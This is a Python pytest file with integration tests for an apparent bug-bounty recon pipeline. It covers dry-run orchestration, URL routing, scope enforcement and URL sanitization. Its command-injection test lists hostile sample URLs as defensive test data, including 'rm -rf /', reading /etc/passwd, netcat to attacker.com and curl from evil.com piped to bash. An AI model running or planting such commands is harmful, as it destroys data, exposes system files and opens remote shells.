"""
Integration Tests for The Hunter's Loop Pipeline.
Tests end-to-end workflows in dry-run mode.
"""
import pytest
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))


class TestPipelineIntegration:
    """End-to-end integration tests using dry-run mode."""
    
    @pytest.fixture
    def mock_env(self, tmp_path):
        """Sets up a mock environment for testing."""
        os.environ["DATA_DIR"] = str(tmp_path)
        os.environ["GEMINI_API_KEY"] = ""
        os.environ["DISCORD_WEBHOOK_URL"] = ""
        
        # Create scope file
        scope_file = tmp_path / "scope_rules.json"
        scope_file.write_text('{"allowed_domains": [".testdomain.com"], "excluded_domains": []}')
        
        return tmp_path
    
    @pytest.mark.integration
    def test_dry_run_pipeline(self, mock_env):
        """Test that the pipeline runs in dry-run mode without errors."""
        from core.orchestrator import Orchestrator
        
        # Patch settings to use test scope
        with patch("config.settings.settings.SCOPE_FILE", mock_env / "scope_rules.json"):
            orchestrator = Orchestrator(target="testdomain.com", dry_run=True)
            
            # Should not raise any exceptions
            orchestrator.run()
            
            assert True  # Pipeline completed
    
    @pytest.mark.integration
    def test_router_integration(self, mock_env):
        """Test that router correctly processes URLs from recon."""
        from modules.router import Router, TargetType
        
        # Simulate URLs that would come from recon
        mock_urls = [
            "https://www.testdomain.com/login",
            "https://api.testdomain.com/v1/users?id=1",
            "https://www.testdomain.com/wp-content/themes/test",
            "https://www.testdomain.com/static/app.js",
            "https://www.testdomain.com/page?search=test"
        ]
        
        router = Router()
        queues = router.route_targets(mock_urls)
        
        assert len(queues[TargetType.LOGIN]) == 1
        assert len(queues[TargetType.API]) == 1
        assert len(queues[TargetType.CMS]) == 1
        assert len(queues[TargetType.JS_FILE]) == 1
        assert len(queues[TargetType.DYNAMIC]) == 1


class TestSecurityIntegration:
    """Security-focused integration tests."""
    
    @pytest.mark.security
    def test_scope_enforcement_in_pipeline(self):
        """Test that out-of-scope URLs never reach scanners."""
        from utils.scope_guard import ScopeGuard
        
        guard = ScopeGuard()
        guard.allowed_domains = [".target.com"]
        guard.excluded_domains = []
        
        # Simulate URLs that might come from gau/waybackurls (including third-party)
        harvested_urls = [
            "https://www.target.com/page1",
            "https://www.google.com/search?q=target",  # Third-party
            "https://cdn.cloudflare.com/js/app.js",    # CDN
            "https://api.target.com/v1/data",
            "https://fonts.googleapis.com/css",         # Google Fonts
        ]
        
        filtered = [u for u in harvested_urls if guard.is_in_scope(u)]
        
        # Only target.com URLs should remain
        assert len(filtered) == 2
        assert all("target.com" in u for u in filtered)
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test that URLs can't be used for command injection."""
        from security.validator import SecurityValidator
        
        validator = SecurityValidator()
        
        malicious_urls = [
            "https://example.com/; rm -rf /",
            "https://example.com/$(whoami)",
            "https://example.com/`cat /etc/passwd`",
            "https://example.com/| nc attacker.com 1234",
            "https://example.com/; curl evil.com | bash"
        ]
        
        for url in malicious_urls:
            result = validator.sanitize_url(url)
            # Dangerous characters should be escaped or rejected
            assert result is None or ";" not in result
            assert result is None or "|" not in result
